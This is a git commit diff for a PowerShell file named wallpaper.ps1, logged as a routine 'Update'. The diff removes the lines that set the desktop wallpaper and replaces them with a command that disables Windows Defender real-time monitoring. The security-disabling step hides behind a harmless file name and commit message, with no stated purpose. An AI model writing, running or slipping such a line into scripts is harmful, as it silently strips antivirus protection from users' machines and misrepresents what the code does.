c89af3c69405367ac133acb6a157ba307f03d658
Criptc <96071765+Criptc@users.noreply.github.com>
2022-03-06 15:15:55 -0600

    Update wallpaper.ps1

--- wallpaper.ps1
+++ wallpaper.ps1
@@ -1,2 +1,1 @@
-Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value C:\Users\$env:UserName\AppData\Local\Temp\img.jpg
-rundll32.exe user32.dll, UpdatePerUserSystemParameters
+Set-MpPreference -DisableRealtimeMonitoring $true
